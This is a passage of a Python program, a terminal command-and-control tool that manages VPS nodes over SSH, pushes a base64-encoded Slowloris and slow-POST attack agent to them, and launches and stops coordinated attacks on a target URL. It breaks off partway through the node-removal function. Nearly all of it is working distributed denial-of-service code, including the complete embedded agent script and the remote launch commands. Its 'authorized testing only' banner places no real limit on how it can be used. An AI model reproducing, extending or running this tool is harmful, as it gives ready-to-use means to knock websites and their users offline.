#!/usr/bin/env python3
"""
Distributed Slow HTTP Testing C2 - Complete Terminal Interface (FIXED)
Author: Security Research Tool
Purpose: Educational and Authorized Penetration Testing Only

⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️
Unauthorized use against systems you don't own is ILLEGAL!
"""

import sqlite3
import paramiko
import threading
import json
import time
import os
import sys
import signal
import socket
import random
import string
import subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import base64
from cryptography.fernet import Fernet
import colorama
from colorama import Fore, Back, Style
from urllib.parse import urlparse

# Initialize colorama for cross-platform colored output
colorama.init(autoreset=True)

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    PURPLE = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    BOLD = Style.BRIGHT
    DIM = Style.DIM
    RESET = Style.RESET_ALL

class SecurityManager:
    def __init__(self):
        key_file = 'key.key'
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                self.key = f.read()
        else:
            self.key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(self.key)
            os.chmod(key_file, 0o600)  # Secure permissions
        self.cipher = Fernet(self.key)
    
    def encrypt_password(self, password):
        return base64.b64encode(self.cipher.encrypt(password.encode())).decode()
    
    def decrypt_password(self, encrypted_password):
        try:
            return self.cipher.decrypt(base64.b64decode(encrypted_password.encode())).decode()
        except Exception:
            return encrypted_password  # Fallback for unencrypted passwords

class DatabaseManager:
    def __init__(self, db_file='c2_database.db'):
        self.db_file = db_file
        self.init_database()
    
    def init_database(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        # VPS nodes table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vps_nodes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT NOT NULL UNIQUE,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                ssh_port INTEGER DEFAULT 22,
                status TEXT DEFAULT 'offline',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                location TEXT,
                capabilities TEXT
            )
        ''')
        
        # Attack sessions table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_name TEXT NOT NULL,
                target_url TEXT NOT NULL,
                target_host TEXT,
                attack_type TEXT NOT NULL,
                vps_nodes TEXT,
                start_time TIMESTAMP,
                end_time TIMESTAMP,
                status TEXT DEFAULT 'pending',
                parameters TEXT,
                results TEXT
            )
        ''')
        
        # Attack results table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id INTEGER,
                vps_ip TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                connections_active INTEGER DEFAULT 0,
                packets_sent INTEGER DEFAULT 0,
                status TEXT,
                FOREIGN KEY (session_id) REFERENCES attack_sessions (id)
            )
        ''')
        
        conn.commit()
        conn.close()
        
        # Set secure permissions
        os.chmod(self.db_file, 0o600)
    
    def add_vps(self, ip, username, encrypted_password, port=22, location="Unknown"):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                INSERT INTO vps_nodes (ip_address, username, password, ssh_port, location)
                VALUES (?, ?, ?, ?, ?)
            ''', (ip, username, encrypted_password, port, location))
            conn.commit()
            return cursor.lastrowid
        except sqlite3.IntegrityError:
            return None
        finally:
            conn.close()
    
    def get_all_vps(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM vps_nodes ORDER BY id')
        vps_list = cursor.fetchall()
        conn.close()
        return vps_list
    
    def update_vps_status(self, ip, status):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE vps_nodes SET status = ?, last_seen = ? WHERE ip_address = ?
        ''', (status, datetime.now().isoformat(), ip))
        conn.commit()
        conn.close()
    
    def remove_vps(self, ip):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM vps_nodes WHERE ip_address = ?', (ip,))
        affected_rows = cursor.rowcount
        conn.commit()
        conn.close()
        return affected_rows > 0
    
    def create_attack_session(self, session_name, target_url, target_host, attack_type, vps_list, parameters):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO attack_sessions (session_name, target_url, target_host, attack_type, vps_nodes, parameters, start_time, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (session_name, target_url, target_host, attack_type, json.dumps(vps_list), json.dumps(parameters), datetime.now().isoformat(), 'running'))
        
        session_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return session_id
    
    def get_attack_sessions(self, limit=20):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM attack_sessions ORDER BY start_time DESC LIMIT ?', (limit,))
        sessions = cursor.fetchall()
        conn.close()
        return sessions

class SSHManager:
    def __init__(self, security_manager):
        self.connections = {}
        self.security_manager = security_manager
    
    def connect_vps(self, ip, username, encrypted_password, port=22, timeout=15):
        try:
            password = self.security_manager.decrypt_password(encrypted_password)
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                hostname=ip,
                username=username,
                password=password,
                port=port,
                timeout=timeout
            )
            
            self.connections[ip] = ssh
            return True, "Connected successfully"
            
        except Exception as e:
            return False, str(e)
    
    def disconnect_vps(self, ip):
        if ip in self.connections:
            try:
                self.connections[ip].close()
                del self.connections[ip]
                return True
            except Exception:
                pass
        return False
    
    def execute_command(self, ip, command, timeout=45):
        if ip not in self.connections:
            return False, "No connection to VPS"
        
        try:
            stdin, stdout, stderr = self.connections[ip].exec_command(command, timeout=timeout)
            
            # Wait for command to complete
            exit_status = stdout.channel.recv_exit_status()
            
            output = stdout.read().decode('utf-8', errors='ignore').strip()
            error = stderr.read().decode('utf-8', errors='ignore').strip()
            
            if exit_status == 0:
                return True, output
            else:
                return False, error if error else f"Command failed with exit status {exit_status}"
                
        except Exception as e:
            return False, str(e)
    
    def deploy_agent(self, ip):
        """Deploy slow HTTP attack agent to VPS - FIXED VERSION"""
        
        # Simplified and reliable agent script
        agent_script = '''#!/usr/bin/env python3
import socket,threading,time,sys,random,string,signal,argparse
from urllib.parse import urlparse

class SlowHTTPAttack:
    def __init__(self,host,port=80):
        self.host,self.port,self.conns,self.running=host,port,[],False
        self.stats={'sent':0,'errors':0,'active':0}
    
    def create_socket(self):
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((self.host,self.port))
            return s
        except:
            self.stats['errors']+=1
            return None
    
    def slowloris_attack(self,num_conns=100,delay=15,duration=0):
        print(f"[SLOWLORIS] Starting attack on {self.host}:{self.port}")
        print(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
        
        self.running=True
        start_time=time.time()
        
        # Create initial connections
        print("[PHASE1] Creating initial connections...")
        for i in range(num_conns):
            if not self.running:
                break
            
            sock=self.create_socket()
            if sock:
                try:
                    # Send partial HTTP request
                    request=f"GET /?id={random.randint(1000,99999)} HTTP/1.1\\r\\n"
                    request+=f"Host: {self.host}\\r\\n"
                    request+=f"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\\r\\n"
                    request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                    request+="Accept-Language: en-US,en;q=0.5\\r\\n"
                    request+="Connection: keep-alive\\r\\n"
                    
                    sock.send(request.encode())
                    self.conns.append(sock)
                    self.stats['sent']+=1
                    
                    if (i+1) % 50 == 0:
                        print(f"[PROGRESS] {i+1}/{num_conns} connections created")
                        
                except Exception:
                    self.stats['errors']+=1
                    try:
                        sock.close()
                    except:
                        pass
            
            time.sleep(0.01)  # Small delay to avoid overwhelming
        
        self.stats['active']=len(self.conns)
        print(f"[PHASE1] Complete. Active connections: {len(self.conns)}")
        
        # Keep connections alive phase
        print("[PHASE2] Starting keep-alive phase...")
        cycle_count=0
        
        while self.running and self.conns:
            # Check duration limit
            if duration > 0 and (time.time() - start_time) >= duration:
                print("[DURATION] Time limit reached, stopping attack...")
                break
            
            cycle_count+=1
            active_before=len(self.conns)
            
            # Send keep-alive headers to all connections
            for sock in self.conns[:]:
                try:
                    # Generate random header
                    header_name=''.join(random.choice(string.ascii_letters) for _ in range(random.randint(8,15)))
                    header_value=''.join(random.choice(string.ascii_letters+string.digits) for _ in range(random.randint(10,20)))
                    header=f"X-{header_name}: {header_value}\\r\\n"
                    
                    sock.send(header.encode())
                    self.stats['sent']+=1
                    
                except Exception:
                    # Connection failed, remove it
                    self.conns.remove(sock)
                    self.stats['errors']+=1
                    try:
                        sock.close()
                    except:
                        pass
                    
                    # Try to create replacement connection
                    new_sock=self.create_socket()
                    if new_sock:
                        try:
                            req=f"GET /?id={random.randint(1000,99999)} HTTP/1.1\\r\\nHost: {self.host}\\r\\nConnection: keep-alive\\r\\n"
                            new_sock.send(req.encode())
                            self.conns.append(new_sock)
                            self.stats['sent']+=1
                        except Exception:
                            try:
                                new_sock.close()
                            except:
                                pass
            
            self.stats['active']=len(self.conns)
            active_after=len(self.conns)
            
            print(f"[CYCLE {cycle_count}] Active: {active_after} | Sent: {self.stats['sent']} | Errors: {self.stats['errors']} | Lost: {active_before-active_after}")
            
            # Sleep between cycles
            time.sleep(delay)
    
    def slow_post_attack(self,num_conns=50,delay=10,duration=0):
        print(f"[SLOW-POST] Starting attack on {self.host}:{self.port}")
        print(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
        
        self.running=True
        start_time=time.time()
        
        def post_worker(worker_id):
            sock=self.create_socket()
            if not sock:
                return
            
            try:
                # Send POST headers with large content-length
                content_length=random.randint(1000000,10000000)
                post_request=f"POST /?worker={worker_id} HTTP/1.1\\r\\n"
                post_request+=f"Host: {self.host}\\r\\n"
                post_request+="Content-Type: application/x-www-form-urlencoded\\r\\n"
                post_request+=f"Content-Length: {content_length}\\r\\n"
                post_request+="Connection: keep-alive\\r\\n\\r\\n"
                
                sock.send(post_request.encode())
                self.stats['sent']+=1
                print(f"[WORKER {worker_id}] POST headers sent, content-length: {content_length}")
                
                # Send POST data very slowly
                bytes_sent=0
                while self.running and bytes_sent < content_length:
                    # Check duration limit
                    if duration > 0 and (time.time() - start_time) >= duration:
                        print(f"[WORKER {worker_id}] Duration limit reached")
                        break
                    
                    # Send small chunk of data
                    chunk_size=random.randint(1,10)
                    data=''.join(random.choice(string.ascii_letters+string.digits) for _ in range(chunk_size))
                    sock.send(data.encode())
                    bytes_sent+=chunk_size
                    self.stats['sent']+=chunk_size
                    
                    # Progress report every 10KB
                    if bytes_sent % 10000 == 0:
                        print(f"[WORKER {worker_id}] Sent {bytes_sent}/{content_length} bytes ({bytes_sent/content_length*100:.1f}%)")
                    
                    # Slow delay
                    time.sleep(delay)
                
                print(f"[WORKER {worker_id}] Completed: {bytes_sent} bytes sent")
                
            except Exception as e:
                print(f"[WORKER {worker_id}] Error: {str(e)}")
                self.stats['errors']+=1
            finally:
                try:
                    sock.close()
                except:
                    pass
        
        # Create worker threads
        threads=[]
        print(f"[THREADS] Starting {num_conns} POST worker threads...")
        
        for i in range(num_conns):
            if not self.running:
                break
            thread=threading.Thread(target=post_worker,args=(i+1,),daemon=True)
            thread.start()
            threads.append(thread)
            print(f"[THREAD] Worker {i+1} started")
            time.sleep(0.2)  # Stagger thread creation
        
        # Monitor threads
        print(f"[MONITOR] {len(threads)} threads active, monitoring...")
        while self.running:
            # Check duration limit
            if duration > 0 and (time.time() - start_time) >= duration:
                print("[DURATION] Time limit reached, stopping...")
                break
            
            active_threads=sum(1 for t in threads if t.is_alive())
            print(f"[STATUS] Active threads: {active_threads}/{len(threads)} | Total bytes sent: {self.stats['sent']} | Errors: {self.stats['errors']}")
            
            if active_threads == 0:
                print("[COMPLETE] All threads finished")
                break
            
            time.sleep(10)
    
    def stop_attack(self):
        print("[STOP] Stopping attack...")
        self.running=False
        for sock in self.conns:
            try:
                sock.close()
            except:
                pass
        self.conns.clear()
        print("[STOP] Attack stopped")

def signal_handler(sig,frame):
    print("\\n[SIGNAL] Received interrupt signal")
    global attacker
    if 'attacker' in globals():
        attacker.stop_attack()
    print("[EXIT] Shutting down...")
    sys.exit(0)

def main():
    parser=argparse.ArgumentParser(description='Slow HTTP Attack Agent')
    parser.add_argument('target',help='Target URL or hostname')
    parser.add_argument('attack_type',choices=['slowloris','slow_post'],help='Type of attack to perform')
    parser.add_argument('--connections','-c',type=int,default=100,help='Number of connections (default: 100)')
    parser.add_argument('--delay','-d',type=int,default=15,help='Delay between packets in seconds (default: 15)')
    parser.add_argument('--duration','-t',type=int,default=0,help='Attack duration in seconds (0=unlimited, default: 0)')
    
    args=parser.parse_args()
    
    # Parse target
    if args.target.startswith('http://') or args.target.startswith('https://'):
        parsed=urlparse(args.target)
        target_host=parsed.hostname
        target_port=parsed.port or (443 if parsed.scheme=='https' else 80)
    else:
        target_host=args.target
        target_port=80
    
    print("="*60)
    print("SLOW HTTP ATTACK AGENT")
    print("="*60)
    print(f"Target: {target_host}:{target_port}")
    print(f"Attack: {args.attack_type}")
    print(f"Connections: {args.connections}")
    print(f"Delay: {args.delay}s")
    print(f"Duration: {'Unlimited' if args.duration==0 else f'{args.duration}s'}")
    print("="*60)
    print("WARNING: FOR AUTHORIZED TESTING ONLY!")
    print("="*60)
    
    # Set up signal handlers
    signal.signal(signal.SIGINT,signal_handler)
    signal.signal(signal.SIGTERM,signal_handler)
    
    # Create attacker instance
    global attacker
    attacker=SlowHTTPAttack(target_host,target_port)
    
    try:
        if args.attack_type == "slowloris":
            attacker.slowloris_attack(args.connections,args.delay,args.duration)
        elif args.attack_type == "slow_post":
            attacker.slow_post_attack(args.connections,args.delay,args.duration)
    except KeyboardInterrupt:
        attacker.stop_attack()
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        attacker.stop_attack()

if __name__ == "__main__":
    main()
'''
        
        # Use base64 encoding to avoid shell escaping issues
        encoded_script = base64.b64encode(agent_script.encode()).decode()
        
        commands = [
            "mkdir -p /tmp/slowhttp_c2",
            f"echo '{encoded_script}' | base64 -d > /tmp/slowhttp_c2/agent.py",
            "chmod +x /tmp/slowhttp_c2/agent.py",
            "python3 -c 'import py_compile; py_compile.compile(\"/tmp/slowhttp_c2/agent.py\", doraise=True)'"
        ]
        
        for i, cmd in enumerate(commands):
            success, output = self.execute_command(ip, cmd)
            if not success:
                return False, f"Step {i+1} failed: {output}"
        
        # Test the agent
        success, output = self.execute_command(ip, "python3 /tmp/slowhttp_c2/agent.py --help")
        if not success:
            return False, f"Agent test failed: {output}"
        
        return True, "Agent deployed and tested successfully"
    
    def get_connection_status(self, ip):
        return ip in self.connections

class AttackManager:
    def __init__(self, ssh_manager, db_manager):
        self.ssh_manager = ssh_manager
        self.db_manager = db_manager
        self.active_attacks = {}
        self.monitoring_threads = {}
    
    def launch_attack(self, session_id, target_url, attack_type, vps_list, parameters):
        # Parse target URL
        if target_url.startswith('http'):
            parsed = urlparse(target_url)
            target_host = parsed.hostname or parsed.netloc
        else:
            target_host = target_url.split(':')[0].split('/')[0]
        
        self.active_attacks[session_id] = {
            'target_host': target_host,
            'target_url': target_url,
            'attack_type': attack_type,
            'vps_list': vps_list,
            'status': 'running',
            'start_time': datetime.now(),
            'parameters': parameters
        }
        
        print(f"\n{Colors.YELLOW}[ATTACK] Launching {attack_type} attack on {target_host}{Colors.RESET}")
        print(f"{Colors.CYAN}[CONFIG] VPS nodes: {len(vps_list)} | Connections per VPS: {parameters.get('connections', 1000)}{Colors.RESET}")
        
        success_count = 0
        failed_vps = []
        
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[LAUNCHING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            cmd = self._build_attack_command(target_url, attack_type, parameters)
            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
            
            if success:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                success_count += 1
                # Wait a bit to let the attack start
                time.sleep(1)
            else:
                print(f"{Colors.RED}FAILED{Colors.RESET}")
                failed_vps.append(f"{vps_ip}: {output}")
        
        if success_count > 0:
            print(f"\n{Colors.GREEN}[SUCCESS] Attack launched on {success_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
            if failed_vps:
                print(f"{Colors.YELLOW}[FAILED VPS]:{Colors.RESET}")
                for failure in failed_vps:
                    print(f"  {failure}")
            return True
        else:
            print(f"\n{Colors.RED}[FAILED] Could not launch attack on any VPS{Colors.RESET}")
            for failure in failed_vps:
                print(f"  {failure}")
            return False
    
    def _build_attack_command(self, target_url, attack_type, parameters):
        connections = parameters.get('connections', 1000)
        delay = parameters.get('delay', 15)
        duration = parameters.get('duration', 0)
        
        # Clean target URL for command line
        target_clean = target_url.replace('http://', '').replace('https://', '').split('/')[0]
        
        cmd = f"cd /tmp/slowhttp_c2 && nohup python3 agent.py '{target_clean}' {attack_type}"
        cmd += f" --connections {connections} --delay {delay}"
        if duration > 0:
            cmd += f" --duration {duration}"
        cmd += " > attack.log 2>&1 & echo 'Attack launched with PID:' $!"
        
        return cmd
    
    def stop_attack(self, session_id):
        if session_id not in self.active_attacks:
            return False, "Attack session not found"
        
        vps_list = self.active_attacks[session_id]['vps_list']
        
        print(f"\n{Colors.YELLOW}[ATTACK] Stopping attack on all VPS nodes...{Colors.RESET}")
        
        stop_count = 0
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[STOPPING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            # Kill attack processes
            commands = [
                "pkill -f 'python3 agent.py'",
                "pkill -f 'slowhttp'", 
                "killall python3 2>/dev/null || true",
                "ps aux | grep agent.py | grep -v grep | awk '{print $2}' | xargs kill -9 2>/dev/null || true"
            ]
            
            stopped = False
            for cmd in commands:
                success, output = self.ssh_manager.execute_command(vps_ip, cmd)
                if success:
                    stopped = True
                    break
            
            if stopped:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                stop_count += 1
            else:
                print(f"{Colors.RED}FAILED{Colors.RESET}")
        
        self.active_attacks[session_id]['status'] = 'stopped'
        self.active_attacks[session_id]['end_time'] = datetime.now()
        
        print(f"\n{Colors.GREEN}[SUCCESS] Attack stopped on {stop_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
        return True, f"Attack stopped on {stop_count} nodes"
    
    def get_attack_status(self, session_id):
        if session_id not in self.active_attacks:
            return {}
        
        vps_list = self.active_attacks[session_id]['vps_list']
        status = {}
        
        for vps_ip in vps_list:
            # Check for running attack processes with multiple methods
            commands = [
                "ps aux | grep 'python3 agent.py' | grep -v grep | wc -l",
                "pgrep -f 'python3.*agent.py' | wc -l",
                "ps -ef | grep agent.py | grep -v grep | wc -l"
            ]
            
            active_processes = 0
            for cmd in commands:
                success, output = self.ssh_manager.execute_command(vps_ip, cmd)
                if success and output.strip().isdigit():
                    active_processes = max(active_processes, int(output.strip()))
                    break
            
            status[vps_ip] = {
                'active_processes': active_processes,
                'status': 'attacking' if active_processes > 0 else 'idle'
            }
        
        return status

class SlowHTTPTUI:
    def __init__(self):
        self.security_manager = SecurityManager()
        self.db_manager = DatabaseManager()
        self.ssh_manager = SSHManager(self.security_manager)
        self.attack_manager = AttackManager(self.ssh_manager, self.db_manager)
        self.running = True
        
        # Handle Ctrl+C gracefully
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _signal_handler(self, sig, frame):
        print(f"\n{Colors.YELLOW}[EXIT] Shutting down C2 server...{Colors.RESET}")
        
        # Stop all active attacks
        for session_id in list(self.attack_manager.active_attacks.keys()):
            self.attack_manager.stop_attack(session_id)
        
        # Close SSH connections
        for ip in list(self.ssh_manager.connections.keys()):
            self.ssh_manager.disconnect_vps(ip)
        
        self.running = False
        print(f"{Colors.GREEN}Goodbye!{Colors.RESET}")
        sys.exit(0)
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        banner = f"""{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                    DISTRIBUTED SLOW HTTP TESTING C2                         ║
║                           Terminal Interface v1.1                           ║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.RED}{Colors.BOLD}⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️{Colors.RESET}
{Colors.RED}   Unauthorized use against systems you don't own is ILLEGAL!{Colors.RESET}

"""
        print(banner)
    
    def print_menu(self):
        menu = f"""
{Colors.BOLD}MAIN MENU:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} VPS Management
{Colors.GREEN}[2]{Colors.RESET} Launch Distributed Attack
{Colors.GREEN}[3]{Colors.RESET} Monitor Active Attacks  
{Colors.GREEN}[4]{Colors.RESET} Attack History
{Colors.GREEN}[5]{Colors.RESET} System Status
{Colors.GREEN}[0]{Colors.RESET} Exit

{Colors.YELLOW}Select option (0-5): {Colors.RESET}"""
        print(menu)
    
    def input_with_prompt(self, prompt, required=True):
        while True:
            try:
                value = input(f"{Colors.CYAN}{prompt}{Colors.RESET}").strip()
                if not required or value:
                    return value
                print(f"{Colors.RED}This field is required{Colors.RESET}")
            except KeyboardInterrupt:
                return None
    
    def vps_management_menu(self):
        while self.running:
            self.clear_screen()
            self.print_banner()
            
            vps_list = self.db_manager.get_all_vps()
            
            print(f"{Colors.BOLD}VPS MANAGEMENT{Colors.RESET}")
            print("=" * 50)
            
            if vps_list:
                print(f"\n{'ID':<4} {'IP Address':<15} {'Username':<12} {'Status':<10} {'Location':<15} {'Last Seen'}")
                print("-" * 80)
                
                for vps in vps_list:
                    status_color = Colors.GREEN if vps[5] == 'online' else Colors.RED
                    last_seen = vps[7][:19] if vps[7] else 'Never'
                    print(f"{vps[0]:<4} {vps[1]:<15} {vps[2]:<12} {status_color}{vps[5]:<10}{Colors.RESET} {(vps[8] or 'Unknown'):<15} {last_seen}")
            else:
                print(f"\n{Colors.YELLOW}No VPS nodes configured{Colors.RESET}")
            
            menu = f"""
{Colors.BOLD}VPS OPERATIONS:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} Add VPS Node
{Colors.GREEN}[2]{Colors.RESET} Test All Connections
{Colors.GREEN}[3]{Colors.RESET} Deploy Agents to All
{Colors.GREEN}[4]{Colors.RESET} Remove VPS Node
{Colors.GREEN}[5]{Colors.RESET} Test Single VPS
{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu

{Colors.YELLOW}Select option (0-5): {Colors.RESET}"""
            
            print(menu)
            choice = input().strip()
            
            if choice == '1':
                self.add_vps()
            elif choice == '2':
                self.test_all_connections()
            elif choice == '3':
                self.deploy_all_agents()
            elif choice == '4':
                self.remove_vps()
            elif choice == '5':
                self.test_single_vps()
            elif choice == '0':
                break
            else:
                print(f"{Colors.RED}Invalid option{Colors.RESET}")
                time.sleep(1)
    
    def add_vps(self):
        print(f"\n{Colors.BOLD}ADD NEW VPS NODE{Colors.RESET}")
        print("-" * 25)
        
        try:
            ip = self.input_with_prompt("IP Address: ")
            if not ip:
                return
            
            username = self.input_with_prompt("SSH Username: ")
            if not username:
                return
            
            password = self.input_with_prompt("SSH Password: ")
            if not password:
                return
            
            port = self.input_with_prompt("SSH Port (default 22): ", False) or "22"
            try:
                port = int(port)
            except ValueError:
                print(f"{Colors.RED}Invalid port number{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            location = self.input_with_prompt("Location (optional): ", False) or "Unknown"
            
            encrypted_password = self.security_manager.encrypt_password(password)
            
            vps_id = self.db_manager.add_vps(ip, username, encrypted_password, port, location)
            if vps_id:
                print(f"{Colors.GREEN}[SUCCESS] VPS added to database{Colors.RESET}")
                
                # Test connection
                print(f"{Colors.YELLOW}[INFO] Testing connection...{Colors.RESET}")
                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                
                status = 'online' if success else 'offline'
                self.db_manager.update_vps_status(ip, status)
                
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] Connection test passed{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[ERROR] Connection test failed: {message}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[ERROR] VPS already exists or database error{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def test_all_connections(self):
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes to test{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}TESTING ALL VPS CONNECTIONS{Colors.RESET}")
        print("-" * 40)
        
        for vps in vps_list:
            ip, username, encrypted_password, port = vps[1], vps[2], vps[3], vps[4]
            print(f"{Colors.CYAN}[TESTING] {ip}...{Colors.RESET} ", end="", flush=True)
            
            success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
            status = 'online' if success else 'offline'
            self.db_manager.update_vps_status(ip, status)
            
            if success:
                print(f"{Colors.GREEN}ONLINE{Colors.RESET}")
            else:
                print(f"{Colors.RED}OFFLINE - {message}{Colors.RESET}")
        
        input("\nPress Enter to continue...")
    
    def test_single_vps(self):
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}TEST SINGLE VPS{Colors.RESET}")
        print("-" * 20)
        
        for i, vps in enumerate(vps_list, 1):
            print(f"{i}. {vps[1]} ({vps[2]}@{vps[1]}:{vps[4]})")
        
        try:
            choice = self.input_with_prompt("Select VPS number: ")
            if not choice or not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(vps_list):
                vps = vps_list[idx]
                ip, username, encrypted_password, port = vps[1], vps[2], vps[3], vps[4]
                
                print(f"{Colors.CYAN}[TESTING] {ip}...{Colors.RESET}")
                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] Connection established{Colors.RESET}")
                    
                    # Test command execution
                    print(f"{Colors.CYAN}[TESTING] Command execution...{Colors.RESET}")
                    success, output = self.ssh_manager.execute_command(ip, "whoami && pwd && python3 --version")
                    
                    if success:
                        print(f"{Colors.GREEN}[SUCCESS] Command execution test passed{Colors.RESET}")
                        print(f"Output: {output}")
                    else:
                        print(f"{Colors.RED}[ERROR] Command execution failed: {output}{Colors.RESET}")
                    
                    self.db_manager.update_vps_status(ip, 'online')
                else:
                    print(f"{Colors.RED}[ERROR] Connection failed: {message}{Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'offline')
            else:
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def deploy_all_agents(self):
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps[5] == 'online']
        
        if not online_vps:
            print(f"{Colors.YELLOW}[INFO] No online VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}DEPLOYING AGENTS TO ALL ONLINE VPS{Colors.RESET}")
        print("-" * 50)
        
        successful_deployments = 0
        for vps in online_vps:
            ip = vps[1]
            print(f"{Colors.CYAN}[DEPLOYING] {ip}...{Colors.RESET} ", end="", flush=True)
            
            success, message = self.ssh_manager.deploy_agent(ip)
            
            if success:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                successful_deployments += 1
            else:
                print(f"{Colors.RED}FAILED - {message}{Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[SUMMARY] {successful_deployments}/{len(online_vps)} agents deployed successfully{Colors.RESET}")
        input("\nPress Enter to continue...")
    
    def remove_vps(self):
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes to remove{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}REMOVE VPS NODE{Colors.RESET}")
        print("-" * 20)
        
        for i, vps in enumerate(vps_list, 1):
            print(f"{i}. {vps[1]} ({vps[8] or 'Unknown'})")
        
        try:
            choice = self.input_with_prompt("Select VPS number to remove: ")
            if not choice or not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(vps_list):
                vps = vps_list[idx]
                
                confirm = input(f"{Colors.YELLOW}Remove VPS {vps[1]}? (y/N): {Colors.RESET}").strip().lower()
                
                if confirm == 'y':
                    # Disconnect if connected
                    self.ssh_manager.disconnect_vps(vps[1])
                    
                    # Remove from database
                    if self.db_manager.remove_vps(vps[1]):
                        print(f"{Colors.GREEN}[SUCCESS] VPS removed{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}[ERROR] Failed to remove VPS{Colors.RESET}")
                else:
                    print(f"{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
            else:
